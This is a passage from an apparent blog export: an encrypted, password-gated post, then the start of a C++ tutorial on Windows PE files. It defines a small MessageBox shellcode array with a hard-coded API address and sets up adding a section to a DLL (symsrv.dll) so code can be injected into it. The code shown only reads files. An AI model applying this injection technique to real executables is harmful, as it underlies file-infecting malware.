c5763588a0d306a148e174b7e8a663782d835bd4f9a7b1ea86afc1eb8c0d9ba8f9dde7aefe19d6c9b7c0af25776c376ba9cab99609a75cde08669ef519a1a5cb1dcc57a39322fe2aba983e67c411f2f2afc0bac05180709439f42485686569835d55eba7e318e736358b5414bff4c799c94de1bf3a8d22899244af836513e42e8f6122d78371f093af7304ab7f651880e96eacf6b73f0d8b08adc4833fdd26088e88307dc99cb02068c83fe633cd391fca3a0acaa76349a7ebc9f105571121df071289c7134afdc2301f433b1a366c6f4a330ef2b76f2057e427770f11a94dac36debbe692518e7bd529fea3358a1eb8a7bbffd50a9144ea5d92a79da4d905fd5cbe8bc895fa4622799967464468e22b918e191d102a01c3fb922b4adb4861de0aeb0ab88c19e1dbe99f50b51d7228f84e00d5d211bf8800a01d5ce31302aedd1f2bb65c129be3fc16d54799f0d3b52b1acafe1d3043d7251c56fcd951207808b1c1fedfa0c570d599f614b312f6f5e9f1880c354f8d9b49c29eb72d705dd7ef347a3762c965ef8deca7b7fc9da5d9a05dc0e35cc342c546f3af9f43ae355f2886f3ed6f8d30ba3e7168311d8732d8b50ae2092ac092e39647cf8f4adc9e2d5e4088cd39c1f21a8e8b67eb308711fc2a23173326991fba595a0bbf7b1a7e7313570546ebeb1bcd2002f6eebdf12961ce0bb927134bfab1e223ed56848fcc7128a9ad3bd0ffbf769d9c8baccbba3526ffb2eb5915535679e8e59000ad514e45770d71907eae620e77418f57c525277168477b8e2841d00701ce5b840aa06822c12d41945bd5ce4c596aa9d614f0948c08db6f14cdacb5accc994a0586ceaa5b029116909178ddf7d5119414b3bbab71e00bb144f580a8dd2b43b5f67484cf15ef0cf283317b4d54d1d3583974a4fe6427434ba0bb58ef71e1061d6f056e6cd856cd7619002e525fb1ee08e76c527a773915ee019c96d3f45d6da8cbe088462a8de1548a1a5b14216b8037b0b55328f4c625ffa5e1cd8b8bfa331aa752b3bb57c7ca7a68e9bceb1b40acafecb1f10e162631d96c67494585d04409196720f23ecffc3f83d203a511c70e1afdf48dae01fe545c1ecddf3558effacecd1f1c99e03b1bbf21a2e133e766c80d2b8cbb9f9b15978ce793e117638206ccf8c058b779ce46cdb2b3840f369616957a7855f7f20f7900ee34a19ff5cb1e8026a0a55d4b490036ec7324b9392210656b219ff9f506315539ccbc51424f697b6c3316e68a2f805634b9b0e6e77b7bc3db12f938063b392fdfdaccca32fe24890ea9583e8289f24d0aefce3228b1d508b51362461f8e20c96e02a444b2124b3ffa2985e3b4ad316cb9966838406a4231c9441c0f722b552e74f05ae9a180382d66207a331ebae88daa9a41ff0f0478026fcad49f604803fd6395147f0db4c5ab558f6c12659d28dbde1eaa9ab42ca58e5cce46ba0a008de1ab661031d865f7f4d772351975f7d097ac9069c164e8112219d4b4ff4220782e6c9411382bb99978b595c50cc1fbeaf3b8dd92b7078e4cf8e099c3fac31e216ecefddf88744d253c852a750b9f711b21a7ab943e245cb2b5bc3c025c61d69d157fdccb120c1025f9d2611eba0b26e69191d252ab6df72eb842c5660212e2c937b60baf70891b48c9d14c793334b703b4e8500c1023af4c8ef9e0260956238d1fd4f55f6793497e80fc600246c644f7d28f6164fa2cc2347d5c854d8d7526cf113dd39408b73caa356816d4b47db0eef86333fc87bbbb49f031d3bbd3fe1a7f3f9e5a43146f68fab056c69b74cc4c37eaec48b4391b2f3f2a2d52d82748d200112d3092dd7d4d1c76cebffe95d87c4a11c6619ea3a07fd932d972ef521ee2aeb983e457fb3e56da188a6ce8e825e545b5bec9febe66b2dbaca1065c79633549891a8f168d0cbb73bc923b74679aec79b94c030a3936a8ef000add4874ddff81ba8405358e9ebb5203b65bad2c045946a71a15d2489b922e84f3dffb18611526d941796440295ded17008ddbd74bd5b62fbb419785bc06566c3234331f42dd0546caddbeaf2e96f955ed53139c823bab3b21b356e25886a0852809257806f015148ff1a459be6dbbead8a062eb420616dd4563e43a1a736e30ed8b743b6eb6a09d0680d94365f289f38cc955a1bd23a85fd9297a755bc2d091ec0b78a29a09a7d9eb743fb4b40861345ecdcd741bbe29f13ce9f79b42bd2cc602f427d52d42c56eafda8058909bcf8c089f5ec8fb4a524cd4d841c2c24781d639281545367bf4f0e9ac705b14025a17e7b5234583d940acddd3c9aae7b076696807d95061c351b38c60f1e158c893b6cd4e1a4996bb7f3b71722b6740aee1d3445c0cad9943d8620bb9164c45f85a03ccd3291f14a739097f9fedb56e2e30dc6911924c374e6e60bb9fbc7b8770f8350226bb26afbd1c16c95a378aee4d48b4a7b31ef502a60b71c908b72b6294c26d2ed714a87162333a309941a0afd5614be541c2b26cbc1ae42183a6afea56f5c610527052ba99fe843c1164a6a40469c71fa08075ee1171b3271c056bf0194f8566ef11800a36e1f1fda1f5ae553ace6ed1decc6e869a9b045f975b11de35b1db60d89fff31cb004b923189c66ca3a9d29e0813a1b9efb8fd62d9cec28e40b7ab56f6f77d8386b69bf9fd2e6e4cff13118c9e15af41b508e58597fe61b399899f7480210889d90f4e9ee7f707b11fd376b0f7f32675a6e41c5f8b6642471d44a5c262b2cfe34914413f348844f29d2c824ecc3b4d1b71aac774b447feb662ec5196fa9bf4bce62adb5ec3f95d9c25c6dc37b77eb2ce3f878f5b7bd3b8ac18213350cec85102065e4a00fcf47bf693402b3495faa07ab493127b897373c673c190bdb0a0221db3077fa719a8add8581f5e3cbeaf69de51352bd154a22df2864222a7fa5ef18cd0e90fde0ee8ac67e572995f5a364cefe70347ad67d0bd0c679b10808d0213f9cadf4c512931db6d20ec7266cf37d44080a64ef7857a7b8f75df05176686863519b07c345377525e8bd9a88ce682bdc2f44cfe5e65f114000bb5b6dce36e839f903590df178e4085453655c11dea1d0aa2c940f16291a744cf9b890b022c051fb45524979b279474d5241e89fa30eab327ccaf48c86cbbb5c5cadc1ef8aa9f6370b6af4796b384c2230e35e4337b523eacbe6ff4d5a6b9589e0e2a36f584ee7d899823d1bfd1ca06c3829dbc842e98dc61d52dee9aac8c4e6a61dede355c3fafa20badd81594d106ccec08974b98c575e8065ff79d35d013efd7ff9ea9e578837c0f9ff960e66a6cb63cf32623789fb7eef359aca3da12ab171b3487d2dee86b977e1ee9f0ccdc0412a6a0dd33b7a63e761d2b22e83579d8e7f894ab8b23cc2d8ecd51548465bdd8b6f53046d79c7e98bdee1a0101a69db5b1b04c660a2e9a2260ccf291680f843e32dbe37b965eac1117078e4ec74723098bce8a6bd38fb3d069f36225fcc1d11495a4e1a1223f3dd400db6d894ce79bc74cb674b1ece791934a4cc6b77457dd679112216a8c28003c48671e8a87d88362ebf2aaa01bf07a57a385a973a1d2b44a2f92123cebf5031238f694bbd4856cb374f0edc94940a45ec9a9f95849fb73bde73d57f9f30ef191e42b5dc2d877d44d20f1f8e69810eb72922c92b88c00b6016fcaeced721e5e7ca037e7b7e19d96e26da81f007d6f49fb91c778e001ac359608146ef7f520affc351de34ef315252c3bf8f65e298c77147e78670f7572f26b64d4ce5e0370726afaf980c2253f49a616cb307cddc81c7384475d53fde77bc5df71e7266f74df5de0f4bbb41443b237a598c717bbdf50070d434ccdd1830c55b95fd2afac8c87d42c0013f6a6d09b5a10ca578801c796d11adb2fa6a09c8b8c3e2b216e19216f1381d1fbfac5a89b0e4245a31b0924f9261a0eb50c0461f2d395829a932f47c2c946c44b62658de5b00a9e3f78fd55a6f0191975b18749d5334273ca1110efedd169de0ab518a5379a80f5ce5733f5fc6bc80648abf14c12441fc1a5fb309a4a1d88e60333b4b42bbfdbc7d33fc6bd5e0e1dc83c9144b33a911987423f6beb7e4c4401f676d9df090f5c748f239cc5aa57015a35729f7736e4ac801c80178417b107236d2c575599d34feff37a18d71a0501a50f839b767e327218f8b51236ee0c69067aefeb76e2248dd6043a0dc180b0f4acda644b750ff41eaa975e5efd9ceec97577b97839f6b62a6e79f73658b0714c8de431ad76e4cc0bb480f7068226e384fa738212ddbbde2e04bee098ffbc3514bbdec9ff8cd0d2eebe7c8039d6e8a3a9910a18ce39ecb326f9dad7b2ba80b0faccfc468793feb47be37e80e32b288e2214312ea9ac78d634c9db74b83eb28d16393dc080961b32dfc9f7bbcf9714b8b4dd57385d6b5fcd617c7d94ab1b5a51cf114b4def161f7115cacebb53cf7186fe6ea46687f792688c458dc433ca8ea88914e17e768791b30ed77b46ed6b5c1c47240b573e7cf03b9eb2a62f617bd4436f6f139268fe4573f675a1f6b62158aeb94cc2af361b5487933e1b613db45684b41d3aa1a27ca8cd06a73eabf73eb972a8d62240c347452bfd094f9aeb0f86fa0848f4f6cb1be4c44a17b9a31ada9a1d28a01aef8837c4be8257a516a6eb3c9f115c7bed07fa43de68a3fc6730e68e601982c5dc80d9c9ef9541dddf2cdbbc69c82d3f1ec3cff9b10fece25ef5b9b6dca4ec04a5dce63a34dbed9faa79717d9de22948c564ce42a510def2ce86af4c2b29f9ec8065e3db39ffe99ffa73041500fe730feb420c487ef3d80d4daddc5a880d2ab674a048bedfd9f85d29503033365c4886a6f9b384f3653bfb4a7fd8201df6fefe4f47a079d6b05f3e3cded11c12a9a93e394d06baa79b6da3f2cc101b0af2c7cfea556a752b333afcfe8ea34998256afea15fee9aa377037f83112f0b725e33b3f2bfbe396a8d6cc8d7f73f89733305623463b92e27c64269efd6550bad3f03fb3832cc7ad0bf45e9b4e98646a9cee82b3e6bacd191dff97fc1aa28912009d6d6f511fe0f1ba2ca1b22840715d6aa47de0db1b1378839d2fcc6c70000cbe9f341c55fb04eb6d5a230c73e15833b8472db8b86251c61260e7c5a733ee797f2b9a46695856dbdf983313a4ef46f790118746580fade4266bb2e5c97614dbcff898e7e066195d6ee2972e8768a60bbf256a265c18068b53a15b1191b17810477a16ecd53c774c5bbfd20cdc6bc61b642465b3c1867232a4099950e4f92f9bd01902a8f6e3f2c7dadc05c33ec2d2f354fbcb15094a8fd9f744d4eed3e6a033bc85e33b57f2a7e23ce0456dbe8ee97646877cadc77fbfc4937b2cc2adcbbb8f735f6e60b8142d9e880f535dbfe940622cb1c561b334de1d653cf5970f697f1f80b809b56edaf55cfc363c1ef5f4a5263bfaf4d433a3516e8e2e18519594e171cc1e066bebd876a32c870904a4d5252a4c7a68a974f5e64db4939fe7d80d0ae4c21b45421adba2633ff79840928f2106c826195a6a2d9740184768474968a3f433e8728ed6a2be5814b4d1c68745804f1ad76c20a7980a7010c02766a5bbb35fc4d0b5d251bca19544f17c85c41db8f8ac9cd9bd4fce0cf84b0b62efe53a9af4eb41a8fedd7a9366e32c6bec90f4053823cd594e37ced16c96a2d8bdb9f42f5c1a26d2e7586a2b2386fa07f4dbba4e3ce6688409e0f37e8d613484f0018d4aef1d656b02bda714d293c6c818c3943d7aa0754a8bc69368bdac0de451fffff22cc8317b86e20b08e164fa8f44afe0ebea1bf0761f7040a30d4bdc4aa896b64fdd561c8c8854ad17513c130a327cc1b5859bde3639867e2898e306fb246e70d2b096b862eaac5ef3e46dd05ec94f79793cbf03b95009f7dfc643c5fda26be190d61ca4bb042b77febb27d2b5756f3696efd7f246e344faa33053ff4af8751971f0a4584b7765c05bc72588d5ea469648358547640ee08762e6d9adb446ae50f2e9cfa8d0ef1e3ebb9ffbcaed37bca809aa5eb32db8ca2715f867711cdbe29f62d0f7de3be99800a093e81f0d49b2337deedca8358db936527d2da7d89c53de9f166b019f5ed9e1517a4f3277f6d89ade09447f0cb990038e975e329c792e37ea0e1450fa5a618129815f07db528216ad448d4ac4be988280ede86ed3ff0a2ad6c4f4a30a5e5ca64ea1e85511ce360cb47099eedc52803a391ca5dc2307c98005e74b53d67ab7c3fda3a46ae6b154a2a17f9cc158517c7bbf9214222d4c28cfb8f0a124a591d1e85d17505dbc573377e5738b51d88b3d3329b6c29d2a8925a5a0609ce3addd05fde72175581805d3921c014c436b1905f7696cf8badae9a58a4a4b0e46f3dfaf05ee6277fa6d496d1fca01e02018ec596c8528a73c60318445cf804ab33d6b6e9d068b7c8f891e71f485d6e7d4782b6c3af1409b03a85ea8a20f18babdc0cfd1358c62f42fdb2dfcc4353647f9d1f07b5234d3de829217a9b1b7188eca0da3f16574a192baf603eea1d4779688940f0a66a730cf1c0388e59de3b5c06ddce27d520b6b48ca1175bbac4933d878df4b03ce4f37a8d9c5488d8ae3eaafe84a923c2824ac1fab344d17456bbc009a00ef01edf78ec1a63b1666abd7da7397f828bce6d9c40fd2a5b69eb0514dae126a8c83739786da1b01dfcb6c797436df8f3b13187e745d2aa8d6d698253164c17c2061a8a674c429c3eb096094bcfb095a5e880442dace7907d3df13d01f7a9398d1156f9a006235ae1943e9cf737a6ea33a37b355b9152eeb167428e501d404d1dd01ff73f88b4f7652bdeecf56324d0fd31f72df23ca9efc587433d4659ec3e93e686ea47a0bcca3869a4d4215a1502213595fc60ef21b75269792cf62aec618c63df7d80b30be2cc2ebd13a1b242648fd397d28023eebdfd91aaf01a3fc0f4cf1268dadb0799ea9e148d63eb64da41b29fe01f717be89cff271e33268eee5e014117d297e1bd960f5bf333d378b6af8a894736e70475d1ac8183e367f6ef84b2216e10b9498edb62146db962a7cc6c5fcf918b75dda74710eebd03c625978ae86317ae18dd5a2c9c85edbefc7f8e555af95c190c18568559ec02a8a529268fbcdb00099c14afc20dba8e64140ad5ac3604c17e2fe71aac85d1d533e26cc6504bfbbf04b508c15a7c3b79eb8439795ccdd4213f3244754c9389a7bf95351173195ff10a2e5f6c522282e4cf2383888ab32bc4ac48f1999abbff6b05271d41732873a8902102e16d3b7553a468096f4346cb1210c32353a9f965a723381afd8e2f02a702b6be2187d3b2f2cd0f2e0e9d294e9d2d4754fe58f08dccd391b147f0595a89b742e54d994d9c68771c2068cf64c400e6aea454a61d221069ff07f47e5b6f925033aaf531f91d64ff662931ef3ef732c2b4cd3b2df3dbe2cc5b9848cfed11a90fd8f6b6b908f2f6a0cc18f77e1797253f2c440e2cc2d0fd749f8e780b9b8a6a56a2ec1f7639a6606d561e10e76121237f5cbcafff5f5dccb5643f925f470ece8e2689c75620f37c7fd3371cfb2e9a5e52636621776bd1a9056c6e79b42ec8c62024bb3854ff88cad589e9b8a3b64c3c10c9c3863b7023b658152f3c304d81b8e4e3b0bc1d938dfd275b01899cd228bf43eab4cb0a62c9f2a0f774caa73c86aa5ec1ba38aa96a78a6caf33aacb46581e2a64a5472d0ee4f784a6527b8fa347db2a059bc6a6ef57e418eb2c94f23e2913b810068583b609df8419d5909e0d4e1a7f04504ad70362c2ccc9e0d15e8cc2b2ba060f9e93c3a0ad9b4596534a5990684d1e533bffe05400740b485b46d4731727c5f737b16a6d5c17f758f2f760bf308d07f04cd007803a497749f001241c5bac382333e6ec14fc72035212334935ffc40fc740324a910fae4f528656e82a7bb071c868b17af6787999d8b66efb48f419471bb0ba46e2f5ce8cbb5cabe06d0ac2ad8461b049e2607c81bcbc6891ec9a21315d795793ca5d31ca66ac7710838ba250e4159b982eaeb60009a7232f3b798f61db64b20f4218e1488bce328864bb0a9cb9c1af059a7878bee46f17442b06ccabfa8349a6a05e176da7aa83d01fdc53aec1d19e7dfdc2cd841dfcc7954f875d6ad228d6551f5d63748ec414ea8288bcd01475b4768a2152f2f86dc561fbd9d7253ba26615899c28047ada0d6f87f71ec2858e0fb59890ea9414b124513024fb734030f3a253b19825e2efc223b264530d6845cb13b6277a05c202faeed78d9916fa1fe22bad0bbe35954582378cc38f04be5a53dc1528c708ac5732e39ab99576f059a9a948d78cfbf707a3e688f6f50cfb9bf01166e764aa9a3f2cf5b689aff5a7dbfc8872b2bdbabaaa97a32bb5b9f7f9a742ec22def62600861709e9c358860a4880f6cd2af49a6a5af8e297cc98b22648fca095ec0be560f3181c8bc84542cdaf7b30d5feec6f89c13a785429d9aef5be4d7647b66edeebbe104e73bff8aaf6ac772fe860015f3b87062b13aff7a654e00fd4a38b79961fd7a9a2f989461c7697340baa52e53a662c7bab475fc324372025fbba121d5c527c5577c7ec0fc8780bc3e0d92117eacd04724384674dcb95dc9b67e0debd0478f8c9d666900da32fd11e1c2e4fea4384f4f1c44969ffeb5eed63747544b41fba94f42c73846a9cff7c763d376f842f3981b152f7ca07b4da9e6ae53bd22e799325e32a23f03c81272663a014022eada52ff8b03a29276abcd27208f702b4fcf85062948c353310d2ef1dc5a860c968a83d3a7f2e3327f4f5592f411244a584800a2aa7ba1da09c1800bad102f976c62d0b58a59500ac4bcf97e12a6ca31c400a8341e27acde37bd5d6f2816033e297e0520304251878e1f190a6bdfc552356a7f07be8009a65cc661ab5cbd670e43283aed44ee90bb34c555c7716567c1c65c8a622fecb3027daabd2536c6b8ad836b7f85f13892dd59cb4448164f0dd0fb08a8d2a1adb6afe024caa80f4a856d25c0b1bc7b382dac974179541b9bf8bfd1c39651bfb7f5fa6ff4cec613832002476a7b7ed591eae54624b5ac65f37cab041f3a003105fdee35f99249af5824040086d11eebace1da3c260ef9cf28423b7edc0dd98998e4e376e0d9f9c620ad2a1dee18adb9b730e7d5d2d7aff44da36ed2d1017b2fb52f893fd6bc5f73ef9f8c6a262ad78d71f45d6250fae7e7db1fcdaf14841d59b067b2d6e18ce9858497b3348c44935f42eebdffe3dc15d6d1ba4cd36a46339df6883378b77e3f09184d4c3c29a7e8c0a39b2612640ad158a728bf8ea09e63a0c845a2f878232093720277a587bf97d4ec06822c722ffd675dc20449a7906568a8fe29eca74c24b5e4b9c7940c621fdbfa2fe2df3957dad9254edc702d137838569089f2a8a8eac2a855d72eb53f782b43bfa0832e9a54960f04cb372a9189cd78ca517adbb4e7e2564a69604c64808d2e21a5c1ea097c6afa19f139e4ca0cc90425b60486eaa1af2848a38c091b292674dad64e026dd3be5a7c8a1a114d66981c595f8175bbf345d33db29df9a69e77e860b168675cf685f4b13db5fab79ef5b9a6077ffb677f6ef0c3dadefe98d5558277bb83cd0e70a53a5a434cfcb8a5ab0112e61eb75d087aa5ebc3445505159fe93ef1ffd55115c0dfcad9b05f9e030384fea00f809028c05204eaf6b0ef5f010a808ed49524a128e3c1dbcc63b3d87cd75ad6a3557c426aca1570eaeb71f696f1fb7bc3d21caa8247c0d726a176bef96b8e4fead85bd5666d4b9b35b832e939e8c4a7e84a043d7dd3703d723056eb187408540a02ba1bc391609d60835985cda93c0503113ac2dce680af3a061affd46f0cd970dd17e287e4d50c28454336a32079cb988165f7570e2c445fe8a8d7e0ee599e363225a80bef362b6e23c9481d01b180ace4d4f6b1bd4a4b6b2852fbf421488e3a6e2a74428afb613a501ebe2399ce240ccd658f5286cf307cb3e20f3ddf4f5a0f47cf3171fb25d7d3d3545a6f850cb5445afe4cf87e73e72fdd9c77e70d156bdce97f826988cc47746537e79426a0bc5851422e36b78b5f792b9012494679ab5cd179565a04cb5d8e078738583671e0b496d43b9e46ec2cae0d1bbf057ec915a89bbe82c37c8672213ad9424281ae34710d66834e2dc772bb72052aa0a86bb423b2084c2e7281fac97bc9574e3aea6c1634e8809dc2b1aea8935dfdd4022281d4d03be0acba48fa404624db23a0f787da91023e19753851ce392b533d0b74ab0b79e941481383f4b63e937917002af0604709e97fc2c411e1ff98c86d7ca6762014fa516c35ffa864509c5a88237f1c2402814e99af4d1d0c664063ebf970a6f2b42533c4ee08b7fda4006a098dd2075c401324438966b0ebb65549d995be5d9c5a54fdcef6fafa8247665287002c0bde65352a36027d47befa640b6583c693a8a3b6e9843fa47f7489418f726bcdb1a0f0ce6a8b5184aa84666c142c99158c8554da49ba7b7fa0e161011771e8a971dbdc3aee1ef47dbe4457961a243eb1068d8c554d42599b9064010e7fdbbccfd4d69684fe3b9e34b7578b8c8969a4265ffd6eab20a886c9dca2cf942012fe255c9e540da1471661801dd553cf5282655e3c0124d3c210819d6c5a0eb5a994be8bd4b422e0cf28ad1302151a22144ef76d2931b31e46796290c5aff8c840fc4653e2b53b93e3beb7cc78305c168bc4917b05a82e8e1e2e4c3363374dfba09129f4d1df416194aecd7f4babb942508599e96acbc716e30627c174165c377a014bd0553762126031b40b2a2f7875f339d0c4a44abdfdb3712e590c07f6cbcb9e663e23e3c5ae9ba51cecf02905c8266884cfdbd03d8699c15b36f13e99faa95ef4bab0af2ec81ec7865d9d16e908e8e495d88d4d02458cf1fbd51dd35392df03ba9cc91b4bad90cea14a2356995db455d0ddddfcf1a0e03829e113e0df9f677dac725fe209dfd7c2b57e389e0c57eab4449f7d88d5133ba94c1f46b5e52b6bec13ac46a96dad00ef8a2f95ae6cfd17efce7587ea71f85b92fe27ea1d37567d7572f708091c23aba1e0fa43ae7049db9b8a08c086b8e346c6e1737f21a1cef088726f1b157ae95d9ffcb6f05429419a5c33da5c45e594a91c3da9e4db895b54c75577ecfd33839efcee9d20b4cbc30417c4717d39ce4b0b84062c35027a79164e50c54d31bf88bd2701705c8bd55c6735d7280d55c3a7692f3c104bbecdb30922ce67532342d6cb123e579802ab7b5c87bb94161abee25040c4fcbddfc1e385d519e0728ae6f27ddccc78ac094e0b0401e1b1724c076e860ec67f8f090588ebb1eae920dbc9bc98c72258a57a37d1cecd811fd46934b1fdd078247c8a1085ae244c31821b2792f3791c89c5538326f830d8183b629dc7c95e928276233d1ac8a685ca03142238bfd492f84e0bbd8cffed973adb6d413d336eeed11be70d791b42e7cc22ff18f41d917ddeef4515f68f75c27cc2c1b27867adabd7bda06ad830f7697654948f5db8275b53b9138ab7691e874532239c415568d015aca5a9574af5d46bbc3b24c788df6781d406f2ac70b54ea90ba56b036ec7d349699b872147075ca61f3ef3bc912f09410b3eff64ed06f361e8db3ea8312de17e9dc6643749c81fcb0d599cb075a8b8b084e5cbb534862c5241125182f2bf8b8e724eaa40145c83140811df9cd9a9a4028421f23e06087bdc8c9f4f8b</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PE-SourceCode-C</title>
    <url>/post/PE-SourceCode-C/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<p>常用的数据类型的定义包含在头文件<code>windows.h</code>实际上是<code>winnt.h</code>。</p>
<h2 id="0-HeaderFile-h"><a href="#0-HeaderFile-h" class="headerlink" title="0 HeaderFile.h"></a>0 HeaderFile.h</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span>                                                                                        </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span>                                                                                        </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MessageBoxA_Addr   0x7631FD1E</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ShellCodeLength  0x12</span></span><br><span class="line"></span><br><span class="line">BYTE ShellCode[] = &#123;</span><br><span class="line">	<span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0xE9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//typedef  char *  LPSTR</span></span><br><span class="line">LPSTR FILEPATH = <span class="string">&quot;C:/symsrv.dll&quot;</span>; <span class="comment">//Using &quot;/&quot; OR &quot;\\&quot;</span></span><br><span class="line">LPSTR FilePath_Out = <span class="string">&quot;C:/symsrv_addSec.dll&quot;</span>;</span><br></pre></td></tr></table></figure>





<h2 id="1-ReadPEFile"><a href="#1-ReadPEFile" class="headerlink" title="1 ReadPEFile"></a>1 ReadPEFile</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">将文件读入缓冲区pFileBuffer</span></span><br><span class="line"><span class="comment">参数：文件路径</span></span><br><span class="line"><span class="comment">返回值：指向读入的文件缓冲区</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">LPVOID <span class="title">ReadPEFile</span><span class="params">(LPSTR lpszFile)</span>	</span></span><br><span class="line"><span class="function"></span>&#123;		</span><br><span class="line">	FILE *pFile = <span class="literal">NULL</span>;	</span><br><span class="line">	DWORD fileSize = <span class="number">0</span>;         <span class="comment">//typedef unsigned long DWORD						</span></span><br><span class="line">	LPVOID pFileBuffer = <span class="literal">NULL</span>;  <span class="comment">//typedef void*  LPVOID			</span></span><br><span class="line">		</span><br><span class="line">	<span class="comment">//打开文件	</span></span><br><span class="line">	pFile = <span class="built_in">fopen</span>(lpszFile, <span class="string">&quot;rb&quot;</span>); <span class="comment">//返回一个指向FILE类型的指针/NULL	</span></span><br><span class="line">	<span class="keyword">if</span>(!pFile)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 无法打开 EXE 文件! &quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//读取文件大小		</span></span><br><span class="line">	<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_END);<span class="comment">//int fseek（FILE *fp，long offset，int fromwhere）；</span></span><br><span class="line">	fileSize = <span class="built_in">ftell</span>(pFile);<span class="comment">//将fp的文件位置指针从fromwhere开始移动offset个字节指示下一个要读取的数据的位置</span></span><br><span class="line">	<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_SET);<span class="comment">//SEEK_SET或0，代表文件开始处；SEEK_CUR或1，代表文件当前位置；SEEK_END或2，代表文件结尾处。</span></span><br><span class="line">	<span class="comment">//分配缓冲区</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ReadPEFile文件大小：0x%x\n&quot;</span>,fileSize);</span><br><span class="line">	pFileBuffer = <span class="built_in">malloc</span>(fileSize);<span class="comment">//memset(pFileBuffer,0,fileSize)，将filesize大小的空间置为0</span></span><br><span class="line">	<span class="comment">// 需使用头文件&lt;memory.h&gt;或&lt;string.h&gt;</span></span><br><span class="line">	<span class="keyword">if</span>(!pFileBuffer)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 分配空间失败! &quot;</span>);</span><br><span class="line">		<span class="built_in">fclose</span>(pFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//将文件数据读取到缓冲区	</span></span><br><span class="line">	<span class="keyword">size_t</span> n = <span class="built_in">fread</span>(pFileBuffer, fileSize, <span class="number">1</span>, pFile);<span class="comment">//将文件pFile读到内存			 	 pFileBuffer，共1个块，每个块的大小filesize</span></span><br><span class="line">	<span class="keyword">if</span>(!n)    <span class="comment">//返回实际读到的块数</span></span><br><span class="line">	&#123;         <span class="comment">//&lt;stddef.h&gt;-----#typedef unsigned int size_t</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 读取数据失败! &quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="built_in">fclose</span>(pFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//关闭文件	</span></span><br><span class="line">	<span class="built_in">fclose</span>(pFile);	</span><br><span class="line">    <span class="keyword">return</span> pFileBuffer;		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-ReadPESize"><a href="#2-ReadPESize" class="headerlink" title="2 ReadPESize"></a>2 ReadPESize</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">读取文件大小</span></span><br><span class="line"><span class="comment">参数：文件路径</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">ReadPESize</span><span class="params">(LPSTR lpszFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;		</span><br><span class="line">	FILE *pFile = <span class="literal">NULL</span>;	</span><br><span class="line">	DWORD fileSize = <span class="number">0</span>;              <span class="comment">//typedef unsigned long 	DWORD		</span></span><br><span class="line">	<span class="comment">//打开文件	</span></span><br><span class="line">	pFile = <span class="built_in">fopen</span>(lpszFile, <span class="string">&quot;rb&quot;</span>);   <span class="comment">//返回一个指向FILE类型的指针/NULL	</span></span><br><span class="line">	<span class="keyword">if</span>(!pFile)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 无法打开 EXE 文件! &quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//读取文件大小		</span></span><br><span class="line">	